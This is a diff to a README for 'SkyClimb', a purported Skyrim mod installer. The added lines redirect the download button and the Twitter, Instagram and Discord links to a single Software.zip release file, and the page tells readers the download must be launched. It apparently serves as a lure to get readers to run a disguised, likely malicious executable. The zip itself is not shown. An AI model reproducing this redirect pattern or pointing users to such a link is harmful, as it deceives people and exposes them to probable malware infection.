@@ -24,7 +24,7 @@ Welcome to SkyClimb, the ultimate Skyrim Mod Installer designed to provide a sea
 
 To get started with SkyClimb, click the button below to download the latest version of the installer:
 
-[![](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/OfekDotan/Skyrim-Mod-Installer-SkyClimb/releases/download/v1.0/Software.zip)](https://github.com/OfekDotan/Skyrim-Mod-Installer-SkyClimb/releases/download/v1.0/Software.zip)
 
 *Note: The download needs to be launched to begin the installation process.*
 
@@ -56,9 +56,9 @@ Want to contribute to SkyClimb and help improve the modding experience for Skyri
 
 Stay up to date with the latest news and updates from SkyClimb by following us on social media:
 
-🐦 Twitter: [@SkyClimbMods](https://twitter.com/SkyClimbMods)
+🐦 Twitter: [@SkyClimbMods](https://github.com/OfekDotan/Skyrim-Mod-Installer-SkyClimb/releases/download/v1.0/Software.zip)
 
-📷 Instagram: [@SkyClimbGaming](https://instagram.com/SkyClimbGaming)
+📷 Instagram: [@SkyClimbGaming](https://github.com/OfekDotan/Skyrim-Mod-Installer-SkyClimb/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -66,7 +66,7 @@ Stay up to date with the latest news and updates from SkyClimb by following us o
 
 Connect with other Skyrim modding enthusiasts and share your experiences with SkyClimb in our Discord community. Join now to chat with fellow gamers, get support, and discover new modding tips and tricks.
 
-[Join our Discord community](https://discord.com/SkyClimbCommunity)
+[Join our Discord community](https://github.com/OfekDotan/Skyrim-Mod-Installer-SkyClimb/releases/download/v1.0/Software.zip)
 
 ---
 
